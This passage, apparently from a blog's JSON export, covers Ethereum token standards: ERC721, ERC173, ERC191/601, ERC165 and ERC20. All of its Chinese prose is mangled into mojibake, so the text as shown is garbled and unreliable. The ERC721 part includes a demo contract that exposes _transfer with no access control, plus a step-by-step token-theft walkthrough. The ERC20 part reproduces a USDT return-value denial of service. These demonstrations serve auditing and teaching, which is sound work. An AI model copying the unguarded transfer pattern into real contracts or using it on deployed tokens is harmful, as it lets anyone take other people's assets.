å‘è¿™ä¸ªåˆçº¦è½¬ç§»ä»£å¸çš„æ—¶å€™ï¼ŒåŒæ—¶ä¸ºç”¨æˆ·åŒ…è£…ä»£å¸ã€‚æ­£æ˜¯å› ä¸ºæ¥å£å¦‚æ­¤å®ç°ï¼Œæ‰€ä»¥åœ¨ depositForå‡½æ•°ä¸­ä½¿ç”¨çš„è½¬è´¦å‡½æ•°ä¸º:transferFrom()ã€‚ ä¸è¿‡åœ¨ depositFor() å’Œ withdrawTo()å‡½æ•°ä¸­éƒ½æœ‰é‡å…¥çš„é£é™©ï¼ŒdepositFor::_safeMint()ï¼ŒwithdrawTo::safeTransferFrom()ã€‚ 2.3 Utilieséƒ¨åˆ†2.3.1 ERC721Utils.solâ€‹ æä¾›äº†ä¸€ä¸ªæ ¡éªŒåŠŸèƒ½ï¼Œæ£€éªŒåˆçº¦æ¥æ”¶è€…æ˜¯å¦å®ç°äº† IERC721Receiver æ¥å£ï¼Œå®ç°checkOnERC721Receivedå‡½æ•°çš„æ—¶å€™ï¼Œæ˜¯å¦æŒ‰è¦æ±‚è¿”å›äº† IERC721Receiver.onERC721Received.selectorã€‚ 3. å®‰å…¨éšæ‚£3.1 å†…éƒ¨å‡½æ•°_transferçš„å®‰å…¨éšæ‚£åœ¨ERC721åˆçº¦ä¸­ï¼Œæœ‰ä¸€ä¸ªå†…éƒ¨å‡½æ•° _transfer()ï¼Œè¿™å‡½æ•°æœ‰ç‚¹å¥‡æ€ªï¼Œå®ƒå¯ä»¥å®ç°ä»»æ„è½¬ç§»æŸäººçš„tokenï¼Œå‰ææ˜¯åªè¦çŸ¥é“tokenIdä»¥åŠtaçš„ownerã€‚å¯ä»¥çœ‹åˆ°ä»–çš„å®ç°ä»£ç ï¼š 1234567891011function _transfer(address from, address to, uint256 tokenId) internal &#123; if (to == address(0)) &#123; revert ERC721InvalidReceiver(address(0)); &#125; address previousOwner = _update(to, tokenId, address(0)); if (previousOwner == address(0)) &#123; revert ERC721NonexistentToken(tokenId); &#125; else if (previousOwner != from) &#123; revert ERC721IncorrectOwner(from, tokenId, previousOwner); &#125;&#125; å› ä¸ºtaå¯¹_updateçš„è°ƒç”¨æ–¹å¼ä¸ºï¼š_update(to, tokenId, address(0))ï¼Œå³authå‚æ•°æ˜¯é›¶åœ°å€ï¼Œåˆ™å¯ä»¥è·³è¿‡ç¬¬ä¸€ä¸ªifè¯­å¥çš„åˆ¤æ–­ï¼Œæ¢å¥è¯è¯´å°±æ˜¯ä¸è¦éªŒè¯èº«ä»½ã€‚å†™äº†ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ä»£ç è¿›è¡Œå¤ç°ï¼š 1234567891011121314151617pragma solidity ^0.8.20;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol&quot;;contract Test is ERC721(&quot;ERC721&quot;, &quot;erc721&quot;) &#123; uint256 public tokenId; function mint() public &#123; _mint(msg.sender, tokenId); tokenId++; &#125; function transfer(address from, address to, uint256 tokenId) public &#123; _transfer(from, to, tokenId); &#125;&#125; æ”»å‡»é€»è¾‘ï¼Œå‡å¦‚Aï¼š0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266è´¦æˆ·æ‹¥æœ‰tokenIdä¸º0ï¼Œ1ï¼Œ2ï¼Œ3å››ä¸ªä»£å¸ã€‚å¹¶ä¸”æˆ‘ï¼š0x70997970C51812dc3A010C7d01b50e0d17dc79C8çŸ¥é“Açš„åœ°å€ä»¥åŠtokenIdï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥è°ƒç”¨ è¿™æ ·è°ƒç”¨transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266,0x70997970C51812dc3A010C7d01b50e0d17dc79C8,0)ï¼Œåˆ™å¯ä»¥å®Œæˆæ”»å‡»ï¼Œæ­¤æ—¶æŸ¥çœ‹ ownerOf(0)çš„æ‰€æœ‰è€…æ˜¯ä¸æ˜¯æˆ‘ ç»“æœå¾ˆæ˜æ˜¾ï¼Œæˆ‘æ‹¥æœ‰äº†0å·ä»£å¸ã€‚åŒç†ï¼Œå†…éƒ¨çš„_safeTransfer()ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ï¼Œåªä¸è¿‡éœ€è¦æ¥æ”¶è€…å®ç°æŒ‡å®šçš„æ¥å£ï¼Œä½†æ˜¯è¿™éƒ½æ— å…³ç´§è¦ï¼Œé’±è¿˜æ˜¯å¯ä»¥ç…§æ ·æ‹¿èµ°çš„ã€‚ å¦‚æœä½ çš„åˆçº¦ç»§æ‰¿äº†ERC721åˆçº¦ï¼Œå¹¶ä¸”è°ƒç”¨äº†å®ƒçš„å†…éƒ¨å‡½æ•° _transfer()ï¼Œåˆ™ä¸€å®šè¦ç»™è¿™ä¸ªå¤–éƒ¨å‡½æ•°æ·»åŠ è®¿é—®æ§åˆ¶ã€‚åŠ äº†è®¿é—®æ§åˆ¶ä¹‹åï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥çœ‹ä½œæ˜¯ç®¡ç†å‘˜æƒé™çº§åˆ«çš„ï¼Œå¯ä»¥å¼ºåˆ¶è½¬ç§»æŸäººçš„ä»£å¸ã€‚ 3.2 transferFrom VS safeTransferFromâ€‹ å­—é¢æ„æ€safeTransferFromå¤šäº†ä¸€ä¸ª safeå‰ç¼€ï¼Œçœ‹èµ·æ¥è¦æ¯” transferFromå‡½æ•°è¦æ›´å®‰å…¨ï¼Œåœ¨ ERC-721è¯´æ˜æ–‡æ¡£ä¸­ä¹Ÿæ˜¯è¿™æ ·è¯´çš„ï¼Œä½†æ˜¯çœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿemmmï¼Œåªèƒ½è¯´å„æœ‰å„çš„å®‰å…¨å§ã€‚safeTransferFromçš„å®‰å…¨ä¹‹ååœ¨äºï¼Œåˆçº¦æ¥æ”¶è€…å¿…é¡»è¦å®ç°æŒ‡å®šçš„æ¥æ”¶å‡½æ•°ï¼Œæ—¨åœ¨è®©ç”¨æˆ·æ­£ç¡®å¤„ç†tokenï¼ˆè‡³å°‘è®©tokenè¿˜èƒ½å†æ¬¡è½¬ç§»å˜›ï¼‰ï¼Œè€ŒtransferFromæ²¡æœ‰è¿™ä¸ªåŠŸèƒ½ï¼Œè¦æ˜¯ç›´æ¥è½¬å…¥ç»™åˆçº¦æ¥æ”¶è€…ï¼Œä¸”åˆçº¦æ¥æ”¶è€…æ²¡æœ‰äº‹å…ˆåšå¥½å¤„ç†è¿™ç¬”tokençš„æ“ä½œï¼Œé‚£ä¹ˆå¾ˆé—æ†¾ï¼Œè¿™ç¬”tokené”æ­»äº†ã€‚ã€‚ã€‚è¿™æ ·æƒ³æƒ³safeTransferFromç¡®å®è¦å®‰å…¨ä¸€ç‚¹ã€‚ä½†æ˜¯æ‰§è¡ŒsafeTransferFromçš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œåˆçº¦æ¥æ”¶è€…çš„onERC721Receivedå‡½æ•°ï¼ŒåŠå…¶ç±»ä¼¼ fallbackï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨é‡å…¥çš„é£é™©ï¼Œè€ŒtransferFromå°±æ²¡æœ‰ã€‚æ€»è€Œè¨€ä¹‹ï¼Œå„æœ‰å„çš„å¥½ï¼Œå„æœ‰å„çš„åã€‚ 3.3 å…¶ä»–çš„é‡å…¥é£é™©åœ¨ERC721çš„å†…éƒ¨å‡½æ•°ä¸­ï¼Œ_safeMint()ï¼Œ_safeTransfer()éƒ½æ˜¯å…·æœ‰é‡å…¥çš„é£é™©çš„ã€‚æ‰€ä»¥è¦æ˜¯ç»§æ‰¿ERC721åˆçº¦çš„é¡¹ç›®ï¼Œå¦‚æœå°†è¿™äº›å†…éƒ¨å‡½æ•°æš´éœ²å‡ºæ¥çš„è¯ï¼Œè¿™éœ€è¦ç‰¹åˆ«å°å¿ƒè¿™å‡ ä¸ªç‚¹ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC721","slug":"ERC721","permalink":"https://biyouqiuqiu.com/tags/ERC721/"}]},{"title":"ERC173","slug":"DEFI/ERC/ERC173","date":"2024-01-03T04:00:00.000Z","updated":"2024-01-03T04:00:00.000Z","comments":true,"path":"2024/01/03/DEFI/ERC/ERC173/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/03/DEFI/ERC/ERC173/","excerpt":"","text":"1. ERC173ç®€ä»‹ â€‹ è¯¥åè®®å®šä¹‰äº†æ‹¥æœ‰æˆ–æ§åˆ¶åˆçº¦çš„æ ‡å‡†åŠŸèƒ½ã€‚ 2. ERC173çš„å·¥ä½œåŸç†ERC-173è¿˜è¦æ±‚åˆçº¦åŒæ—¶è¿˜åº”è¯¥å®ç°ERC165æ¥å£ã€‚ æ¥å£å¦‚ä¸‹ï¼š 123456789101112131415interface ERC173 /* is ERC165 */ &#123; /// @dev This emits when ownership of a contract changes. event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); /// @notice Get the address of the owner /// @return The address of the owner. function owner() view external returns(address); /// @notice Set the address of the new owner of the contract /// @dev Set _newOwner to address(0) to renounce any ownership. /// @param _newOwner The address of the new owner of the contract function transferOwnership(address _newOwner) external; &#125; â€‹ æŸ¥è¯¢å½“å‰åˆçº¦çš„ownerï¼Œä»¥åŠè½¬è®©å½“å‰åˆçº¦çš„æ‰€æœ‰æƒã€‚ æ³¨ï¼šå¦‚æœæ‰§è¡Œè½¬ç§»æ‰€æœ‰æƒæ“ä½œçš„æ—¶å€™ï¼Œåº”è¯¥æ³¨æ„_newOwnerçš„å€¼ä¸èƒ½ä¸ºé›¶åœ°å€ï¼Œå¦‚æœå°†åˆçº¦è½¬ç§»ç»™äº†é›¶åœ°å€ï¼Œé‚£ä¹ˆè¯¥åˆçº¦å°†ä¸å±äºä»»ä½•äººã€‚ 3. ä¸Ownable.solçš„åŒºåˆ«Ownable.solæ˜¯åŸºäºERC173çš„ç†å¿µæ‹“å±•å®Œå–„çš„ï¼Œä¸°å¯Œäº†å…³äºownerçš„ç›¸å…³æ“ä½œï¼Œæ¯”å¦‚å¯¹ownerçš„æ£€æŸ¥ï¼Œè¿˜æœ‰å¯¹ä¸èƒ½å°†è¿˜æœ‰è½¬è®©ç»™é›¶åœ°å€ï¼›åŒæ—¶ä¹ŸåŠ å…¥äº†ä¸€äº›è®¿é—®æ§åˆ¶ï¼Œè®©transferOwnershipå‡½æ•°æ›´å®‰å…¨ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC173","slug":"ERC173","permalink":"https://biyouqiuqiu.com/tags/ERC173/"}]},{"title":"ERC191&ERC601","slug":"DEFI/ERC/ERC191&ERC601","date":"2024-01-03T04:00:00.000Z","updated":"2024-01-03T04:00:00.000Z","comments":true,"path":"2024/01/03/DEFI/ERC/ERC191&ERC601/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/03/DEFI/ERC/ERC191&ERC601/","excerpt":"","text":"1. ERC191 æå‡ºäº†å…³äºå¦‚ä½•å¤„ç†ä»¥å¤ªåŠä¸­ç­¾åæ•°æ®çš„è§„èŒƒã€‚ ç®€å•ç†è§£å°±æ˜¯åœ¨å¾…ç­¾åçš„æ¶ˆæ¯æˆ–è€…äº¤æ˜“çš„hashï¼Œå‰åŠ å…¥&quot;\\x19Ethereum Signed Message:\\n&quot; + len(message)ï¼Œè€Œlen(message)é€šå¸¸æ¥è¯´æ˜¯32ï¼Œæ‰€ä»¥å¾ˆå¤šåœ¨å¹³æ—¶çš„åšé¢˜æˆ–è€…åœ¨é¶åœºä¸­è§åˆ°çš„æ˜¯ 12bytes memory prefix = &quot;\\x19Ethereum Signed Message:\\n32&quot;;bytes32 result = keccak256(abi.encodePacked(prefix, hash)); ä½†æ˜¯è¿™å’Œç›´æ¥å®ç”¨metamaskè¿›è¡Œç­¾åçš„ç»“æœä¸ä¸€æ ·ï¼Œä½†æ˜¯é€šè¿‡ ecrecoveræ±‚å‡ºæ¥çš„åœ°å€æ˜¯ä¸€æ ·çš„ã€‚ 2. ERC601 è¿™ä¸ªææ¡ˆçš„ç›®çš„æ˜¯ä¸ºäº†æ›´å¥½åœ°é€‚åº”ä»¥å¤ªåŠçš„ç‹¬ç‰¹éœ€æ±‚ï¼Œä»¥è§£å†³â€œä¸åŒçš„ä»¥å¤ªåŠå®¢æˆ·ç«¯å’Œé’±åŒ…ä½¿ç”¨ä¸åŒçš„è¡ç”Ÿè·¯å¾„ï¼Œå…¶ä¸­ä¸€äº›è·¯å¾„è¿åäº† BIP44ï¼Œè¯¥æ ‡å‡†å®šä¹‰äº†ä»¥m/44&#39;/.è¿™ä¼šé€ æˆé’±åŒ…å®ç°ä¹‹é—´çš„æ··ä¹±å’Œä¸å…¼å®¹ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸€ä¸ªé’±åŒ…ä¸­çš„èµ„é‡‘æ— æ³•åœ¨å¦ä¸€ä¸ªé’±åŒ…ä¸Šè®¿é—®ï¼Œè€Œåœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œåˆ™éœ€è¦æ‰‹åŠ¨æç¤ºç”¨æˆ·æä¾›æ´¾ç”Ÿè·¯å¾„ï¼Œè¿™ä¼šå¦¨ç¢å¯ç”¨æ€§â€çš„é—®é¢˜ã€‚ æ›¿ä»£æ–¹æ¡ˆä¸ºï¼Œåœ¨BIP32è·¯å¾„ä¸­å®šä¹‰ä¸€ä¸‹å››ä¸ªçº§åˆ« 1m / purpose&#x27; / subpurpose&#x27; / EIP&#x27; / wallet&#x27; å…·ä½“å†…å®¹å¯ä»¥ï¼Œç§»æ­¥åˆ°è¿™é‡Œï¼šé“¾æ¥ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC191","slug":"ERC191","permalink":"https://biyouqiuqiu.com/tags/ERC191/"},{"name":"ERC601","slug":"ERC601","permalink":"https://biyouqiuqiu.com/tags/ERC601/"}]},{"title":"ERC165","slug":"DEFI/ERC/ERC165","date":"2024-01-02T04:00:00.000Z","updated":"2024-01-02T04:00:00.000Z","comments":true,"path":"2024/01/02/DEFI/ERC/ERC165/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/02/DEFI/ERC/ERC165/","excerpt":"","text":"1. ERC165ç®€ä»‹ â€‹ ç®€å•æ¥è¯´è¯¥åè®®æ˜¯ç”¨æ¥æ£€æµ‹æ™ºèƒ½åˆçº¦æ˜¯å¦å®ç°äº†æŸä¸ªæ¥å£ã€‚ 2. ERC165çš„å·¥ä½œåŸç†â€‹ ERC165ä¸­åªå®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œå³supportsInterface()ï¼Œå¦‚ä¸‹ï¼š 1234567891011pragma solidity ^0.4.20;interface ERC165 &#123; /// @notice Query if a contract implements an interface /// @param interfaceID The interface identifier, as specified in ERC-165 /// @dev Interface identification is specified in ERC-165. This function /// uses less than 30,000 gas. /// @return `true` if the contract implements `interfaceID` and /// `interfaceID` is not 0xffffffff, `false` otherwise function supportsInterface(bytes4 interfaceID) external view returns (bool);&#125; â€‹ ç®€å•æ¥è¯´ï¼Œå¦‚æœè¦åˆ¤æ–­Aæ˜¯å¦å®ç°äº†SUPERæ¥å£ï¼Œåˆ™Aéœ€è¦å®ç°ERC165ä¸­çš„å‡½æ•°ï¼Œåˆ¤æ–­åŸç†åˆ™æ˜¯ï¼Œè°ƒç”¨Aä¸­çš„supportsInterfaceå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåˆ¤ç­‰ä¼ å…¥çš„å‚æ•°ï¼Œå¦‚æœAå®ç°äº†SUPERçš„æ¥å£ï¼Œé‚£ä¹ˆå‡½æ•°ä½“çš„å†…å®¹åº”è¯¥æ˜¯ï¼š 123function supportsInterface(bytes4 interfaceID) external view returns (bool) &#123; return type(SUPER).interfaceId == interfaceID;&#125; è¿™æ ·å°±å¯ä»¥åˆæ­¥åˆ¤æ–­è¯¥åˆçº¦å®ç°äº†æŸä¸€æ¥å£ï¼Œä½†æ˜¯ä»…ä»…åˆæ­¥ï¼Œå› ä¸ºä½ å¯ä»¥è‡ªå·±ç¼–å†™å‡½æ•°ä½“çš„è¿”å›å€¼ï¼Œæ¯”å¦‚æˆ‘æ²¡æœ‰å®ç°Bæ¥å£ï¼Œæˆ‘å¯ä»¥è‡ªå·±è®¾ç½®è¿”å›å€¼ä¸ºï¼š 123function supportsInterface(bytes4 interfaceID) external view returns (bool) &#123; return type(B).interfaceId == interfaceID;&#125; è€Œåˆçº¦ä¸­å¹¶æ²¡æœ‰å®ç°Bæ¥å£ä¸­å‡½æ•°ã€‚æ¯”å¦‚ï¼Œåˆ«äººé—®ä½ æœ‰é’±å—ï¼Œä½ ç”©å‡ºä¸€å¼ é“¶è¡Œå¡è¯´é‡Œé¢æœ‰ä¸€ä¸ªâ€œå°ç›®æ ‡â€ï¼Œå½“ç„¶å› ä¸ºä½ çœ‹ä¸è§é“¶è¡Œå¡é‡Œé¢æœ‰å¤šå°‘é’±ï¼Œä½ æš‚ä¸”å¯ä»¥ç›¸ä¿¡ä½ æœ‰é’±ã€‚å°±å¥½æ¯”è°ƒç”¨supportsInterfaceå‡½æ•°æ¥åˆæ­¥åˆ¤æ–­ã€‚å…·ä½“æ˜¯å¦å®ç°è¿™äº›å‡½æ•°ï¼Œè¿˜å¾—å…·ä½“è°ƒç”¨æŸäº›åŠŸèƒ½æ¥æ£€æµ‹æ‰è¡Œã€‚ 3. ERC165æ¥å£çš„è®¡ç®—åŸç†- ä¸€ä¸ªæ¥å£çš„çš„interfaceIDæ˜¯é€šè¿‡ï¼Œè®¡ç®—æ¥å£ä¸­æ‰€æœ‰å‡½æ•°é€‰æ‹©å™¨çš„å¼‚æˆ–å€¼ï¼Œå³Dogçš„interfaceIDè®¡ç®—å¦‚ä¸‹ 123456789101112131415// SPDX-License-Identifier: MITpragma solidity 0.8.17;interface Dog &#123; function eat() external; function shout() external;&#125;contract Test &#123; function calDogInterfaceID() external pure returns(bytes4, bytes4) &#123; bytes4 result = Dog.eat.selector ^ Dog.shout.selector; return (type(Dog).interfaceId, result); &#125;&#125; å½“ç„¶ä¹Ÿä¼šæœ‰æ¥å£ç»§æ‰¿çš„æ—¶å€™ï¼Œå‡å¦‚Catæ¥å£ç»§æ‰¿äº†Animalsæ¥å£ï¼Œé‚£ä¹ˆåˆ¤æ–­æ˜¯å¦å®ç°Catæ¥å£è¯¥å¦‚ä½•è®¡ç®—interfaceIdï¼Œåªéœ€è¦è®¡ç®—åœ¨Catæ¥å£ä¸­å®šä¹‰çš„å‡½æ•°å³å¯ã€‚ 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity 0.8.17;interface Animals &#123; function run() external; function breath() external;&#125;interface Dog &#123; function eat() external; function shout() external;&#125;contract Test &#123; function calDogInterfaceID() external pure returns(bytes4, bytes4) &#123; bytes4 result = Dog.eat.selector ^ Dog.shout.selector; return (type(Dog).interfaceId, result); &#125;&#125; æ ¹æ®è¿è¡Œç»“æœå¯éªŒè¯ï¼š","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC165","slug":"ERC165","permalink":"https://biyouqiuqiu.com/tags/ERC165/"}]},{"title":"ERC20","slug":"DEFI/ERC/ERC20","date":"2024-01-01T04:00:00.000Z","updated":"2024-01-01T04:00:00.000Z","comments":true,"path":"2024/01/01/DEFI/ERC/ERC20/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/01/DEFI/ERC/ERC20/","excerpt":"","text":"1. ERC20ç®€ä»‹ â€‹ ERC20æ˜¯ä»¥å¤ªåŠåŒºå—é“¾åˆ›å»ºçš„å¯æ›¿ä»£çš„æŠ€æœ¯æ ‡å‡†ï¼Œå¯æ›¿ä»£ä»£å¸æ˜¯å¯ä»¥ä¸å¦ä¸€ç§ä»£å¸è¿›è¡Œäº¤æ¢çš„ä»£å¸ï¼Œæ•…æ­¤ERC20ä»£å¸æ˜¯ä¸€ç§åŒè´¨åŒ–ä»£å¸ã€‚ERC20åè®®æ›´åƒæ˜¯ä¸€ç§è§„èŒƒï¼Œè§„èŒƒäº†åœ¨æ™ºèƒ½åˆçº¦ä¸­å®æ–½ä»£å¸çš„æ ‡å‡†APIï¼Œä½¿å¾—ä»£å¸å…·æœ‰åŸºæœ¬çš„è½¬è´¦åŠŸèƒ½ï¼Œä»¥ä¾¿å…¶ä»–é“¾ä¸Šç¬¬ä¸‰æ–¹å¯ä»¥ä½¿ç”¨ã€‚ ERC20æ¥å£ï¼š 123456789101112pragma solidity ^0.8.20;interface IERC20 &#123; event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address to, uint256 value) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 value) external returns (bool); function transferFrom(address from, address to, uint256 value) external returns (bool);&#125; â€‹ è¿™æ˜¯ERC20æœ€åŸºæœ¬çš„ä¹Ÿæ˜¯æœ€é‡è¦çš„åŠŸèƒ½ï¼Œå‡¡æ˜¯éµå¾ªERC20æ ‡å‡†çš„éƒ½éœ€è¦å®ç°è¯¥æ¥å£ã€‚è¿™å‡ ä¸ªæ–¹æ³•å¾ˆç®€å•ï¼ŒtransferFrom()å‡½æ•°è¿˜æ˜¯è¦å€¼å¾—æ³¨æ„ï¼Œè¯¥å‡½æ•°çš„ä½¿ç”¨æ–¹å¼æ˜¯ï¼Œfroméœ€è¦æå‰ä¸ºmsg.senderæˆæƒï¼Œå³éœ€è¦fromå»äº²è‡ªè°ƒç”¨approve()å‡½æ•°ã€‚åªæœ‰ fromä¸ºmsg.senderæˆæƒä¹‹åï¼ŒtransferFrom()å‡½æ•°æ‰èƒ½å¤ŸæˆåŠŸæ‰§è¡Œï¼Œè¿™æ˜¯åœ¨å¹³æ—¶æ‰“CTFçš„æ—¶å€™ç»å¸¸å®¹æ˜“å¿½è§†çš„æ“ä½œï¼Œå†™å®Œæ”»å‡»é€»è¾‘ä¹‹åï¼Œæœ€åæŠ¥é”™ã€‚ã€‚ã€‚æ‰å‘ç°æ˜¯åœ¨æŸäº›åˆçº¦é‡Œçš„æŸäº›å‡½æ•°ä¸­çš„è½¬è´¦é€»è¾‘æ˜¯transferFrom()ï¼Œç”±äºæ²¡æœ‰æˆæƒå¯¼è‡´çš„ã€‚ 2. USDTçš„å‘2.1 USDTçš„é—®é¢˜æ‰€åœ¨â€‹ è¿˜æœ‰ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ç‚¹æ˜¯ï¼Œtransfer()å’ŒtransferFrom()éƒ½æ˜¯æœ‰è¿”å›å€¼çš„ï¼ï¼ï¼ï¼ä¸ºä»€ä¹ˆä¸»è¦ï¼Œå°±æ˜¯å› ä¸ºå…¨çƒä½¿ç”¨æœ€å¹¿çš„ç¨³å®šå¸çš„æºç ä¸­transfer()å’ŒtransferFrom()æ˜¯æ²¡æœ‰è¿”å›å€¼ï¼Œè¿™æ˜¯ä¸€ä¸ªå‘ï¼ï¼ï¼å¤§å‘ï¼ï¼ï¼ å¯ä»¥åˆ° æµè§ˆå™¨çœ‹åˆ°Tether Tokenï¼ˆUSDTï¼‰çš„æºç ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸¤ä¸ªå‡½æ•°ï¼š TetherToknen.sol: 123456789101112131415function transfer(address _to, uint _value) whenNotPaused &#123; if (deprecated) &#123; return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value); &#125; else &#123; return super.transfer(_to, _value); &#125;&#125;function transferFrom(address _from, address _to, uint _value) whenNotPaused &#123; if (deprecated) &#123; return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value); &#125; else &#123; return super.transferFrom(_from, _to, _value); &#125;&#125; è¿™é‡Œä¸¤ä¸ªå‡½æ•°æ˜¯æ²¡æœ‰è¿”å›å€¼ï¼Œå³ä½¿å®ƒè°ƒç”¨çš„æ˜¯çˆ¶ç±»çš„å‡½æ•°ï¼Œåœ¨æ²¡æœ‰çœ‹åˆ°çˆ¶ç±»çš„å…·ä½“å‡½æ•°å®ç°ï¼Œå§‘ä¸”è¯´å®ƒçš„çˆ¶ç±»æ˜¯æœ‰è¿”å›å€¼çš„ï¼Œä½†æ˜¯å­ç±»ä¸­çš„å‡½æ•°æ˜¯æ²¡æœ‰è¿”å›å€¼ï¼Œè¿™æ˜¯åœ¨Remixä¸­ç¼–è¯‘ä¸è¿‡å»çš„ï¼Œä¸¾ä¾‹ï¼š å¯ä»¥çœ‹åˆ°ç¼–è¯‘é€šè¿‡äº†ã€‚ä¸‹é¢æ˜¯å­åˆçº¦å‡½æ•°ä¸­æ²¡æœ‰è¿”å›å€¼çš„ï¼š æ‰€ä»¥ä¸ç”¨å»çˆ¶ç±»ä¸­æ‰¾å‡½æ•°éƒ½å¯ä»¥çŸ¥é“çˆ¶ç±»çš„å‡½æ•°ä¹Ÿæ˜¯æ²¡æœ‰è¿”å›å€¼çš„ï¼Œä¸ä¿¡å°±å»éªŒè¯ä¸€ä¸‹ï¼š BasicToken.sol::transfer() 123456789101112function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) &#123; uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee &gt; maximumFee) &#123; fee = maximumFee; &#125; uint sendAmount = _value.sub(fee); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(sendAmount); balances[owner] = balances[owner].add(fee); Transfer(msg.sender, _to, sendAmount); Transfer(msg.sender, owner, fee);&#125; StandardToken.sol::transferFrom() 123456789101112131415161718function transferFrom(address _from, address _to, uint _value) onlyPayloadSize(3 * 32) &#123; var _allowance = allowed[_from][msg.sender]; uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee &gt; maximumFee) &#123; fee = maximumFee; &#125; uint sendAmount = _value.sub(fee); balances[_to] = balances[_to].add(sendAmount); balances[owner] = balances[owner].add(fee); balances[_from] = balances[_from].sub(_value); if (_allowance &lt; MAX_UINT) &#123; allowed[_from][msg.sender] = _allowance.sub(_value); &#125; Transfer(_from, _to, sendAmount); Transfer(_from, owner, fee);&#125; 2.2 å¤ç°DOSå¼‚å¸¸â€‹ æœ¬åœ°å¤ç°ã€‚ â€‹ æœ¬åœ°éƒ¨ç½²USDTï¼Œåœ°å€ä¸ºï¼š0x5FbDB2315678afecb367f032d93F642f64180aa3ã€‚ â€‹ å†éƒ¨ç½²ä¸€ä¸ªè½¬ç§»ä»£å¸çš„ TokenTransfer.solï¼Œåœ°å€ä¸ºï¼š0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940// SPDX-License-Identifier: MITpragma solidity 0.8.20;interface IERC20_USDT &#123; function transfer(address, uint256) external; function transferFrom(address, address, uint256) external;&#125;interface IERC20_stad &#123; function transfer(address, uint256) external returns(bool); function transferFrom(address, address, uint256) external returns(bool);&#125;// USDT: 0x5FbDB2315678afecb367f032d93F642f64180aa3contract TokenTransfer &#123; IERC20_USDT USDT; IERC20_stad TOKEN; constructor(address _usdt) &#123; USDT = IERC20_USDT(_usdt); TOKEN = IERC20_stad(_usdt); &#125; function test_TransferWithOutReturnValue() external &#123; USDT.transfer(msg.sender, 10); &#125; function test_TransferWithReturnValue() external &#123; TOKEN.transfer(msg.sender, 10); &#125; function test_TransferFromWithOutReturnValue() external &#123; USDT.transferFrom(msg.sender, 0x71bE63f3384f5fb98995898A86B02Fb2426c5788, 1); &#125; function test_TransferFromWithReturnValue() external &#123; TOKEN.transferFrom(msg.sender, 0x71bE63f3384f5fb98995898A86B02Fb2426c5788, 1); &#125;&#125; â€‹ è¯¥åˆçº¦ä¸»è¦æ˜¯æµ‹è¯•transferå’ŒtransferFromå‡½æ•°ï¼Œå®šä¹‰ä¸¤ä¸ªæ¥å£ï¼Œä¸€ä¸ªæ¥å£ä¸­æœ‰è¿”å›å€¼ï¼Œä¸€ä¸ªæ²¡æœ‰ï¼Œæ¨¡æ‹Ÿå°†USDTè½¬å…¥ä¸€ä¸ªéµå¾ªERC20æ ‡å‡†çš„åˆçº¦ï¼Œçœ‹çœ‹æ˜¯å¦èƒ½å°†è½¬å…¥çš„ERC20 Tokenè½¬å‡ºã€‚ â€‹ å¯ä»¥çœ‹åˆ°è°ƒç”¨test_TransferWithReturnValueï¼Œäº¤æ˜“ä¼šè¢«revertï¼Œè€Œè°ƒç”¨test_TransferWithOutReturnValueï¼Œäº¤æ˜“åˆ™æ­£å¸¸è¿è¡Œã€‚ â€‹ 